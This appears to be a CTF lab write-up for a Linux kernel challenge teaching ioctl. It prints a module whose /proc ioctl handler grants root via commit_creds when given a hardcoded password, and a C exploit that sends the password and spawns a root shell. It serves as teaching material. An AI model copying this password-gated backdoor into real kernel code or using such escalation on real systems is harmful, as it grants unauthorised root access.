---
title: "Procfs Ioctl Challenge"
description: "Documentation of a kernel challenge that uses ioctl for authentication and privilege escalation."
date: "2026-01-05"
order: 10
draft: false
---

# Procfs Ioctl Challenge: Direct Device Control

This challenge introduces the `ioctl` (Input/Output Control) system call. While `read` and `write` are standard for data streams, `ioctl` is used for device-specific operations that don't fit the standard model. In kernel pwn, `ioctl` is often the primary entry point for complex vulnerabilities.

## The Driver Code

The module creates `/proc/pwnioctl`. It implements the `proc_ioctl` (or `unlocked_ioctl`) callback to handle custom commands.

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>

#define PROC_FILENAME "pwnioctl"
#define IOCTL_WIN_CMD 0x1337
#define SECRET_PASSWORD "uiiaiiuuiiai"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("fitrafep");
MODULE_DESCRIPTION("Ioctl Password Challenge");

static struct proc_dir_entry *proc_entry;

static void win(void)
{
    printk(KERN_INFO "ioctl_chall: Password correct! Elevating privileges...\n");
    commit_creds(prepare_kernel_cred(NULL));
}

static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    char password[32];
    int len;

    if (cmd != IOCTL_WIN_CMD)
        return -EINVAL;

    // arg is treated as a user-space pointer to the password string
    if (copy_from_user(password, (char __user *)arg, sizeof(password) - 1))
        return -EFAULT;

    password[sizeof(password) - 1] = '\0';
    len = strlen(SECRET_PASSWORD);

    if (strncmp(password, SECRET_PASSWORD, len) == 0) {
        win();
        return 0;
    }

    printk(KERN_INFO "ioctl_chall: Incorrect password provided via ioctl.\n");
    return -EACCES;
}

#ifdef HAVE_PROC_OPS
static const struct proc_ops proc_fops = {
    .proc_ioctl = device_ioctl,
};
#else
static const struct file_operations proc_fops = {
    .unlocked_ioctl = device_ioctl,
};
#endif

static int __init ioctl_chall_init(void)
{
    proc_entry = proc_create(PROC_FILENAME, 0666, NULL, &proc_fops);
    return proc_entry ? 0 : -ENOMEM;
}

static void __exit ioctl_chall_exit(void)
{
    proc_remove(proc_entry);
}

module_init(ioctl_chall_init);
module_exit(ioctl_chall_exit);
```

## Makefile

```makefile
obj-m += secret_chall.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

## The Ioctl Mechanism

The `ioctl` system call takes three arguments: a file descriptor, a command number, and an optional argument (usually a pointer or a long).

- **Command (`cmd`)**: A unique integer identifying the operation. Here, `0x1337` triggers the win check.
- **Argument (`arg`)**: In this driver, `arg` is cast to a `char __user *`. The kernel uses `copy_from_user` to read the password string from the user process's memory.

## Exploit Script (C)

This script uses the `ioctl()` system call to send the password directly to the kernel module.

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define IOCTL_WIN_CMD 0x1337
#define SECRET_PASSWORD "uiiaiiuuiiai"

int main() {
  // 1. Open the proc entry
  int fd = open("/proc/pwnioctl", O_RDWR);
  if (fd < 0) { perror("open"); return 1; }

  // 2. Send the secret password via ioctl
  if (ioctl(fd, IOCTL_WIN_CMD, SECRET_PASSWORD) < 0) {
    perror("ioctl");
    return 1;
  }

  // 3. Verify root escalation
  if (getuid() == 0) {
    printf("[+] Success! We are root.\n");
    system("/bin/sh");
  } else {
    printf("[-] Failed to get root.\n");
  }

  close(fd);
  return 0;
}
```

## Deployment

Modify the `rootfs/init` script to load the module and trigger the exploit:

```diff
-exec /bin/sh
+insmod /secret_chall.ko
+su pwn -c "/exploit_secret"
+poweroff -f
```

Finally, rebuild the rootfs and launch the environment:

```bash
./pack.sh && ./run.sh
```
